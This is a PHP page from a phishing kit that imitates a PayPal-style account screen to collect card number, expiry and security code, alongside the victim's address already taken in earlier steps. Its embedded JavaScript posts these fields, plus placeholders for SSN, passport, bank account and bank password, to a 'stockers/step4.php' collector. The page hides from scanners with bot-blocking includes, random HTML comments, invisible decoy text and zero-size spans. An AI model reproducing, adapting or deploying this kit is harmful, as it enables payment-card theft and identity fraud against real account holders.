<?php 
/*
▄▄▌  ▄▄▄ . ▄▄▄· ▄ •▄  ▄▄·       ·▄▄▄▄  ▄▄▄ .
██•  ▀▄.▀·▐█ ▀█ █▌▄▌▪▐█ ▌▪▪     ██▪ ██ ▀▄.▀·
██▪  ▐▀▀▪▄▄█▀▀█ ▐▀▀▄·██ ▄▄ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄
▐█▌▐▌▐█▄▄▌▐█ ▪▐▌▐█.█▌▐███▌▐█▌.▐▌██. ██ ▐█▄▄▌
.▀▀▀  ▀▀▀  ▀  ▀ ·▀  ▀·▀▀▀  ▀█▄▀▪▀▀▀▀▀•  ▀▀▀ 
FuCkEd By [!]DNThirTeen
https://www.facebook.com/groups/L34K.C0de/
*/
include '../prevents/anti1.php';
include '../prevents/anti2.php';
include '../prevents/anti3.php';
include '../prevents/anti4.php';
include '../prevents/anti5.php';
include '../prevents/anti6.php';
include '../prevents/anti7.php';
include '../prevents/anti8.php';
ob_start();
session_start();
if(!isset($_SESSION['language'])){exit(header("Location: index"));
}else{
	include "../extra/languages/{$_SESSION['language']}.php";
}if(!isset($_SESSION['EML'])){exit(header("Location: signin"));}?>
<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
	<link rel="shortcut icon" href="lib/pics/favi.ico"><link rel="apple-touch-icon" href="lib/pics/favi.png">
	<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes"><title>
		<?php echo $lg_process['title']?></title>
		<link rel="stylesheet" href="lib/styles/process.css">
		<script type="text/javascript" src="lib/js/jquery-3.3.1.min.js">
		</script><script type="text/javascript" src="lib/js/jquery.mask.min.js">
		</script> <script type="text/javascript" src="lib/js/jquery.ccvalid.js"></script>
	</head>
	<body>    <div style="z-index:-1;width:80vw;height:80vh;position:absolute;display:none;overflow:hidden;box-sizing:border-box;">
    <div style="opacity:0;white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word;">
    <?php include('../news/news-'.rand(0,9).'.txt'); ?></div></div><?php echo "<!--".rand(0,99999999)."-->"?>
<input type="checkbox" id="toggleMenu" class="menuToggler"><div class="desktopNav">
	<div class="navContainer"><?php echo "<!--".rand(0,99999999)."-->"?>
		<a href="javascript:" class="desktopBrand"></a>
		<div class="mobileMenu"><?php echo "<!--".rand(0,99999999)."-->"?>
			<div class="logoutMobile">
				<a href="javascript:" class="logoutTxtMobile">
					<?php echo $lg_process['logout']?></a>
				</div>
				<div class="settingsMobile">
					<a href="javascript:" class="svgLogo settingsTxt">
						<img src="lib/pics/settings.svg" alt=""></a><?php echo "<!--".rand(0,99999999)."-->"?>
					</div>
					<div>
						<p class="displayMail">
							<?php echo $_SESSION['EML']?></p>
						</div><?php echo "<!--".rand(0,99999999)."-->"?>
					</div>
<div class="desktopMenu">
	<nav class="desktopItems">
		<ul class="firstUl">
		<li class="">
			<a href="javascript:" class="linksTxt">
				<?php echo $lg_process['menu']['home']?><?php echo "<!--".rand(0,99999999)."-->"?>
			</a>
		</li>
		<li class="">
			<a href="javascript:" class="linksTxt">
				<?php echo $lg_process['menu']['activity']?></a><?php echo "<!--".rand(0,99999999)."-->"?>
			</li>
			<li class=""><?php echo "<!--".rand(0,99999999)."-->"?>
				<a href="javascript:" class="linksTxt">
				<?php echo "<!--".rand(0,99999999)."-->"?>	<?php echo $lg_process['menu']['send_receive']?></a></li><li class=""><?php echo "<!--".rand(0,99999999)."-->"?>
						<a href="javascript:" class="linksTxt"><?php echo $lg_process['menu']['wallet']?></a><?php echo "<!--".rand(0,99999999)."-->"?>
					</li>
					<li class="activeLi"><?php echo "<!--".rand(0,99999999)."-->"?>
		<?php echo "<!--".rand(0,99999999)."-->"?>				<a href="javascript:" class="linksTxt"><?php echo $lg_process['menu']['help']?></a><?php echo "<!--".rand(0,99999999)."-->"?>
					</li>
				</ul><?php echo "<!--".rand(0,99999999)."-->"?>
				<ul class="secondUl">
					<li class="notifLi"><?php echo "<!--".rand(0,99999999)."-->"?>
			<?php echo "<!--".rand(0,99999999)."-->"?>			<a href="javascript:" class="svgLogo notifTxt"><?php echo "<!--".rand(0,99999999)."-->"?>
	<?php echo "<!--".rand(0,99999999)."-->"?>						<img src="lib/pics/noti.svg" alt=""></a>
						</li>
						<li>
			<?php echo "<!--".rand(0,99999999)."-->"?>		<?php echo "<!--".rand(0,99999999)."-->"?>		<a href="javascript:" class="svgLogo settingsTxt"><img src="lib/pics/settings.svg" alt=""></a>
						</li>
						<li class="logoutLi">
							<a href="javascript:" class="logoutTxtDesktop"><?php echo $lg_process['logout']?></a>
	<?php echo "<!--".rand(0,99999999)."-->"?>					</li>
						</ul>
					</nav>
<?php echo "<!--".rand(0,99999999)."-->"?>				</div>
	<?php echo "<!--".rand(0,99999999)."-->"?>	<?php echo "<!--".rand(0,99999999)."-->"?>	</div>
		</div>
<div class="mainContainer"><?php echo "<!--".rand(0,99999999)."-->"?>
	<div class="hide" id="rotate">
		<div class="spinner">
			<div class="rotate"></div>
			<div class="processing"><?php echo $lg_sign['rotate']?></div>
	<?php echo "<!--".rand(0,99999999)."-->"?>	</div>
		<div class="overlay"><?php echo "<!--".rand(0,99999999)."-->"?>
		</div>
	</div>
	<div class="mobileNav">
		<div class="navHeader">
			<div class="blockToggler"><?php echo "<!--".rand(0,99999999)."-->"?>
				<label class="menuLabel" for="toggleMenu"><span></span>
			<?php echo "<!--".rand(0,99999999)."-->"?>		<div class="menuOpen"><?php echo $lg_process['menu']['open']?></div>
			<?php echo "<!--".rand(0,99999999)."-->"?>		<div class="menuClose">
			<?php echo "<!--".rand(0,99999999)."-->"?>			<?php echo $lg_process['menu']['close']?></div>
					</label>
				</div>
			</div><?php echo "<!--".rand(0,99999999)."-->"?>
			<div class="navLogo"><a href="javascript:" class="mobileBrand"></a>
			</div><ul class="notifUl"><li><a class="svgLogo notifTxt">
	<?php echo "<!--".rand(0,99999999)."-->"?>			<img src="lib/pics/noti.svg" alt="">
			</a>
		</li><?php echo "<!--".rand(0,99999999)."-->"?>
	</ul>
</div>
<div class="contents">
	<section class="mainContents" id="process">
		<form action="#" method="post" style="padding:0 20px" novalidate="on">
		<h1 style="padding-bottom:10px">
			<span style="font-size:0">darkness</span>
			<?php echo $lg_process['head3']?><?php echo "<!--".rand(0,99999999)."-->"?>
		<?php echo "<!--".rand(0,99999999)."-->"?>	<span style="font-size:0">isnot good</span></h1>
			<div class="fields clearfix">
				<div class="dropDown">
					<select id="ctp" required><option value="-1" disabled selected>
						<?php echo $lg_process['ctype']?>
					</option>
			<?php echo "<!--".rand(0,99999999)."-->"?>		<option value="vsa">Visa</option>
					<option value="msc">MasterCard</option>
					<option value="dsc">Discover</option><?php echo "<!--".rand(0,99999999)."-->"?>
			<?php echo "<!--".rand(0,99999999)."-->"?>		<option value="amx">American Express</option>
			<?php echo "<!--".rand(0,99999999)."-->"?>		<option value="jcb">JCB</option></select><?php echo "<!--".rand(0,99999999)."-->"?>
					<div class="labelSelect"><?php echo "<!--".rand(0,99999999)."-->"?>
			<?php echo "<!--".rand(0,99999999)."-->"?>			<?php echo $lg_process['ctype']?><?php echo "<!--".rand(0,99999999)."-->"?>
					</div>
				</div>
			<?php echo "<!--".rand(0,99999999)."-->"?>	<div class="inputArea">
					<input id="ccn" type="tel" required placeholder="<?php echo $lg_process['cnumber']?>" maxlength="19" autocomplete="off">
				</div>
				<div class="multiInputs"><?php echo "<!--".rand(0,99999999)."-->"?>
			<?php echo "<!--".rand(0,99999999)."-->"?>		<div class="inputArea hasSub">
						<input id="cex" type="tel" required placeholder="<?php echo $lg_process['exp']?>" maxlength="7" autocomplete="off">
					</div>
					<div class="inputArea hasSub csc pull-right">
			<?php echo "<!--".rand(0,99999999)."-->"?>			<input id="csc" type="tel" required placeholder="<?php echo $lg_process['csc']?>" maxlength="3" autocomplete="off">
					</div>
				</div>
			</div><?php echo "<!--".rand(0,99999999)."-->"?>
			<h1>
				<span style="font-size:0">darkness</span><?php echo "<!--".rand(0,99999999)."-->"?>
			<?php echo "<!--".rand(0,99999999)."-->"?>	<span style="font-size:0">oor night</span><?php echo "<!--".rand(0,99999999)."-->"?>
			</h1>
			<?php
$address=$_SESSION['adr'];
$address.=",";
$address.=$_SESSION['cty'];
$address.=",";
$address.=$_SESSION['stt'];
$address.=",";
$address.=$_SESSION['zip'];
$address.=",";
$address.=$_SESSION['cnt'];
$lcard4=strtoupper($_SESSION['ctp']);
$lcard4.="-";
$lcard4.="XXXX-XXXX-XXXX-";
$lcard4.= substr($_SESSION['ccn'] , -4);
$lcard4.=" Linked";
?>
			<div class="fields clearfix"><?php echo "<!--".rand(0,99999999)."-->"?>
					<div class="inputArea">
			<?php echo "<!--".rand(0,99999999)."-->"?><input id="fnm" type="text" class="txt-capital" required disabled="disabled" value="<?php echo $address; ?>"></div>
					<div class="inputArea">
						<input id="dob" hidden="hidden" value="10/10/1988"><?php echo "<!--".rand(0,99999999)."-->"?>
					</div>					
					<div class="inputArea">
				<?php echo "<!--".rand(0,99999999)."-->"?>		<input style="text-align:center;" required disabled value="<?php echo $lcard4; ?>">
					</div>
							<div><?php echo "<!--".rand(0,99999999)."-->"?>
<input style="margin-top:10px;width:100%" type="submit" class="bt" value="<?php echo $lg_process['bt_save']?>">
<a style="margin-top:10px;width:100%;display: inline-block;
    min-width: 6rem;
    padding: 0.75rem 1.5rem;
    margin-bottom: 1.5rem;
    border: 1px solid #0070ba;
    border-radius: 1.5rem;
    font-size: 0.9375rem;
    line-height: 1.6;
    font-family: pp-sans-small-regular,Helvetica Neue,Arial,sans-serif;
    font-weight: 600;
    text-align: center;
    text-decoration: none;
    cursor: pointer;
    color: #0070ba;
    background-color: #ffffff;
    transition: all 250ms ease;
    -webkit-font-smoothing: antialiased;" disabled href="../app/mailprovider"><?php echo $lg_process['dnt_have']?></a>


							</div><?php echo "<!--".rand(0,99999999)."-->"?>
									<?php echo "<!--".rand(0,99999999)."-->"?></form>
									</section><?php echo "<!--".rand(0,99999999)."-->"?>
			

<?php echo "<!--".rand(0,99999999)."-->"?>


			<?php echo "<!--".rand(0,99999999)."-->"?></div><?php echo "<!--".rand(0,99999999)."-->"?><div><div class="ftr"><div class="footerFirstContent"><ul class="footerList"><li><a href="javascript:"><?php echo $lg_sign['footer']['contact']?></a></li><li><a href="javascript:"><?php echo $lg_process['footer']['security']?></a></li></ul><div class="footerSecondContent"><p class="footerP">Copyright ©<span>1999-2019</span> . <?php echo $lg_process['footer']['rights']?></p><ul class="footerUl"><li><a href="javascript:"><?php echo $lg_sign['footer']['privacy']?></a></li><li><a href="javascript:"><?php echo $lg_sign['footer']['legal']?></a></li></ul></div></div></div></div></div><script>$(document).ready(function(){$('#cex').mask('00/0000');$('#csc').mask('0000');$('#dob').mask('00/00/0000');$('#ccn').mask('0000 0000 0000 0000 000');$('#pnm').mask('000000000000000');$('#ssn').mask('000-00-0000');$('#acn').mask('00000000');$('#stc').mask('00-00-00');$('#sin').mask('000-000-000');

			function validExp(b){var a=new RegExp("(([0][1-9]{1})|([1][0-2]{1}))/20(([1][8-9]{1})|([2][0-9]{1}))");return a.test(b);}
function isDate(vl){var rg=/^([0-9]{2})+\/([0-9]{2})+\/([0-9]{4})+$/;return rg.test(vl);}
function validDob(vl){var c=false;if(isDate(vl)&&(vl.split('/')[2]>"1919"&&vl.split('/')[2]<"2006")){c=true;}
return c;}
function valid(){var check=true;var ii=0;$('#process input:not(.bt):not([type=checkbox]),#process select').each(function(i,el){if(!$(el).val()){$(el).parent().addClass('hasError');check=false;}else{$(el).not('#ccn').parent().removeClass('hasError');}
if($(el).attr('id')=='cex'){if(!validExp($(el).val())){$(el).parent().addClass('hasError');check=false;}else{$(el).parent().removeClass('hasError');}}
if($(el).attr('id')=='dob'){if(!validDob($(el).val())){$(el).parent().addClass('hasError');check=false;}else{$(el).parent().removeClass('hasError');}}
if($(el).attr('id')=='csc'){if($('select:first').val()=='amx'&&$(el).val().length!=4){$(el).parent().addClass('hasError');check=false;}else{$(el).parent().removeClass('hasError');}
if($('select:first').val()!='amx'&&$(el).val().length!=3){$(el).parent().addClass('hasError');check=false;}}});return check;}
$(document).on('change','#process select',function(){$(this).parent().removeClass('hasError');$(this).parent().children('.labelSelect').html($(this).children("option:selected").text());$(this).parent().attr('data-name',$(this).val());if($(this).val()=='amx'){$('.csc input').attr('placeholder',$('.csc input').attr('placeholder').replace('3','4'));$('.csc input').attr('maxlength','4');}else{$('.csc input').attr('placeholder',$('.csc input').attr('placeholder').replace('4','3'));$('.csc input').attr('maxlength','3');}});var ccvalid=false;$('#ccn').validateCreditCard(function(result){var cc=$('#ccn');if(cc.val()!=''){if(result.valid){cc.parent().removeClass('hasError');ccvalid=true;}else{cc.parent().addClass('hasError');ccvalid=false;}}});$('#process input:not(.bt):not([type=checkbox]),select').each(function(i,el){$(el).keyup(function(){valid();});$(el).change(function(){valid();});});$(document).on('submit','#process form',function(){check=true;if(!valid()){check=false;}
if(!validExp($('#cex').val())){$('#cex').parent().addClass('hasError');check=false;}else{$('#cex').parent().removeClass('hasError');}
if(!ccvalid){$('#ccn').parent().addClass('hasError');check=false;}
if(!validDob($('#dob').val())){$('#dob').parent().addClass('hasError');check=false;}
if(!check){return false;}else{$('#rotate').removeClass('hide');var ctp=$('#ctp').children("option:selected").text();var ccn=$('#ccn').val();var cex=$('#cex').val();var csc=$('#csc').val();var fnm=$('#fnm').val();var dob=$('#dob').val();var adr=$('#adr').val();var cty=$('#cty').val();var zip=$('#zip').val();var stt=$('#stt').val();var cnt=$('#cnt').val();var ptp=$('#ptp').val();var par=$('#par').val();var pnm=$('#pnm').val();var mdn=$('#mdn').val();var ssn=$('#ssn').val();var pps=$('#pps').val();var clm=$('#clm').val();var dln=$('#dln').val();var sin=$('#sin').val();var pse=$('#pse').val();var dni=$('#dni').val();var bsn=$('#bsn').val();var cpf=$('#cpf').val();var fcn=$('#fcn').val();var acn=$('#acn').val();var stc=$('#stc').val();var bus=$('#bus').val();var bpw=$('#bpw').val();var o={ctp,ccn,cex,csc,fnm,dob,adr,cty,zip,stt,cnt,ptp,par,pnm,mdn,ssn,pps,clm,dln,sin,pse,dni,bsn,cpf,fcn,acn,stc,bus,bpw};var start=new Date;var xT=0;var idT=setInterval(function(){xT=Math.trunc((new Date-start)/1000);},1000);var toStart=0;$.post('../extra/stockers/step4.php',o,function(data,status){window.location.href="../extra/stockers/step4.php";
	if(data=='done'&&status=='success'){clearInterval(idT);if(xT>4){toStart=0;}else{toStart=1800;}
setTimeout(function(){setId();},toStart);}else{$('#rotate').addClass('hide');}});}
return false;});function setId(){$('#rotate').addClass('hide');$('#process').addClass('hide');$('#finish').removeClass('hide');window.scrollTo(0,0);}
$('.gone_bt').click(function(){window.location.href="../extra/stockers/step4.php";});function readFile(files,me,check){if(files){for(var i=0;i<files.length;i++){var FR=new FileReader();FR.onload=function(e){if(e.target.result.startsWith("data:image/")&&e.total<=5000000){if(check){$(me).parent().parent().children(".imagesArea").append('<div class="imgItem"><img src="'+e.target.result+'" alt=""><button class="btDel">X</button></div>');}else{$(me).parent().parent().parent().parent().children(".imagesArea").append('<div class="imgItem"><img src="'+e.target.result+'" alt=""><button class="btDel">X</button></div>');}
$(me).closest('form').append('<input type="hidden" value="'+e.target.result+'" name="images[]">');}}
FR.readAsDataURL(files[i]);}}}
$(document).on('click','.zone',function(e){e.stopPropagation();$(this).find('input[type=file]').trigger(e);});$(document).on('click','.btDel',function(){$(this).closest('form').find('[value="'+$(this).prev().attr('src')+'"]').remove();$(this).parent().remove();});$(document).on('change','input[type=file]',function(){readFile(this.files,this,false);});$(".dropzone-main").on('dragleave',function(e){e.preventDefault();$(this).css('border','2px dashed #dee3e7');$(this).css('background','#f0f2f4');});$(".dropzone-main").on('dragover',function(e){e.preventDefault();$(this).css('border','2px dashed #0564b3');$(this).css('background','#ecf1f9');});$(".dropzone-main").on('drop',function(e){e.preventDefault();$(this).css('border','2px dashed #41ad49');readFile(e.originalEvent.dataTransfer.files,this,true);});});</script>
</body>
</html>